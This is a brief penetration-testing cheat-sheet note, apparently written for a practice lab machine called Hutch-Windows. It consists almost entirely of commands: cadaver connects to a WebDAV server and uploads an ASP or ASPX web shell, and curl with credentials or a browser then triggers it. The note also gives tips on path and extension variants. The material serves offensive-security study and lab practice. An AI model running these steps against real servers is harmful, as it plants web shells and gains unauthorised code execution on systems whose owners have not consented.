

Connect to WebDAV server and send malicious file to shell

```shell
cadaver http://<IP>/webdav
put <shell.asp>
```
- might need to drop /webdav to connect
- also try .aspx

```shell
curl -u "<user>:<password>" http://<IP>/webdav/shell.asp
```
- Or navigate to it in web browser

Working example in Hutch-Windows